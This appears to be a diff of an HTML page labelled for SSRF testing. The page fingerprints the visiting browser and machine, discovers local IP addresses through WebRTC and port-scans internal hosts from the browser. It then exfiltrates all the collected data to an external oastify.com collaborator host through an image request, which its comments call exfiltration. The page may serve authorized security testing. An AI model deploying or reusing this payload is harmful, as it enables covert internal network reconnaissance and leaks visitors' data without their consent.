@@ -2,19 +2,73 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Browser &amp; PC Details with Exfiltration</title>
+  <title>Enhanced Browser & PC Details for SSRF Testing</title>
   <style>
     body { font-family: sans-serif; margin: 2rem; }
     pre { background: #f4f4f4; padding: 1rem; }
   </style>
 </head>
 <body>
-  <h1>Browser and PC Details</h1>
-  <pre id="details"></pre>
-  
+  <h1>Enhanced Browser and PC Details</h1>
+  <pre id="details">Collecting...</pre>
+
   <script>
-    function getBrowserAndPCDetails() {
-      const details = {
+    async function getLocalIPs() {
+      const ips = [];
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (event) => {
+          if (event.candidate) {
+            const ip = event.candidate.candidate.split(" ")[4];
+            if (!ips.includes(ip)) ips.push(ip);
+          }
+        };
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        pc.close();
+      } catch (e) {
+        console.log("WebRTC IP detection failed:", e);
+      }
+      return ips;
+    }
+
+    async function scanLocalPorts(ips) {
+      const ports = [80, 8080, 3000, 5000, 8000, 8086, 6066];
+      const results = [];
+
+      for (const ip of ips) {
+        for (const port of ports) {
+          const url = `http://${ip}:${port}`;
+          try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 2000);
+            const response = await fetch(url, { signal: controller.signal, credentials: 'omit' });
+            clearTimeout(timeoutId);
+            if (response.ok) {
+              results.push(`Open: ${url}`);
+            }
+          } catch (error) {
+            if (error.name === "AbortError") {
+              results.push(`Timeout: ${url}`);
+            } else {
+              results.push(`Closed or CORS blocked: ${url}`);
+            }
+          }
+        }
+      }
+      return results;
+    }
+
+    async function getBrowserAndPCDetails() {
+      const ips = await getLocalIPs();
+      const portScanResults = await scanLocalPorts(ips.length > 0 ? ips : ["127.0.0.1", "localhost"]);
+      
+      return {
+        // IP and Network Information
+        localIPs: ips,
+        portScanResults: portScanResults,
+
         // Browser properties
         userAgent: navigator.userAgent,
         appName: navigator.appName,
@@ -27,7 +81,7 @@
         online: navigator.onLine,
         
         // Hardware details (if available)
-        hardwareConcurrency: navigator.hardwareConcurrency, // number of logical processors
+        hardwareConcurrency: navigator.hardwareConcurrency,
         deviceMemory: navigator.deviceMemory || "Not available",
         
         // Screen details
@@ -42,41 +96,26 @@
         timezoneOffset: new Date().getTimezoneOffset(),
         
         // Plugins list (if any)
-        plugins: []
+        plugins: Array.from(navigator.plugins).map(p => p.name) || "No plugins available"
       };
-
-      // Collect plugins information if available
-      if (navigator.plugins && navigator.plugins.length > 0) {
-        for (let i = 0; i < navigator.plugins.length; i++) {
-          details.plugins.push(navigator.plugins[i].name);
-        }
-      } else {
-        details.plugins = "No plugins information available";
-      }
-      
-      return details;
     }
 
-    // Get the details
-    const details = getBrowserAndPCDetails();
-    
-    // Display details on the page
-    document.getElementById("details").textContent = JSON.stringify(details, null, 2);
-    
-    // Log details for debugging
-    console.log("Browser & PC Details:", details);
-    
-    // Prepare report with timestamp and details
-    const report = encodeURIComponent(JSON.stringify({
-      timestamp: new Date().toISOString(),
-      details: details
-    }));
-    
-    // Exfiltration: Create an image to send the data without triggering CORS errors
-    const exfiltrationUrl = `https://od547dymv9h693do4u2sfx1nze55t2hr.oastify.com/?report=${report}`;
-    const img = new Image();
-    img.src = exfiltrationUrl;
-    console.log('Exfiltration request sent to od547dymv9h693do4u2sfx1nze55t2hr.oastify.com');
+    (async () => {
+      const details = await getBrowserAndPCDetails();
+      const report = encodeURIComponent(JSON.stringify({
+        timestamp: new Date().toISOString(),
+        details: details
+      }));
+
+      // Display details on the page
+      document.getElementById("details").textContent = JSON.stringify(details, null, 2);
+      
+      // Exfiltration: Send data without triggering CORS errors
+      const exfiltrationUrl = `https://od547dymv9h693do4u2sfx1nze55t2hr.oastify.com/?report=${report}`;
+      const img = new Image();
+      img.src = exfiltrationUrl;
+      console.log('Exfiltration request sent to od547dymv9h693do4u2sfx1nze55t2hr.oastify.com');
+    })();
   </script>
 </body>
 </html>
